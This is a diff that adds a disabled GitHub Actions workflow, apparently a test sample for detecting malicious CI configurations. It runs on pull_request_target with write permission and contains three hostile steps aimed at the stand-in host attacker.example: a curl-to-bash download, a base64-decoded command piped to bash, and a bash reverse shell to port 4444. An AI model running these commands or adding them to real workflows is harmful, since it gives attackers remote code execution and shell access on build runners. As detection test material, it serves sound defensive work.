@@ -1,0 +1,16 @@
+name: suspicious workflow execution
+
+on: pull_request_target
+
+permissions:
+  contents: write
+
+jobs:
+  suspicious:
+    if: ${{ false }}
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -fsSL https://attacker.example/bootstrap.sh | bash
+      - run: echo "ZXZpbA==" | base64 -d | bash
+      - run: bash -i >& /dev/tcp/attacker.example/4444 0>&1
+
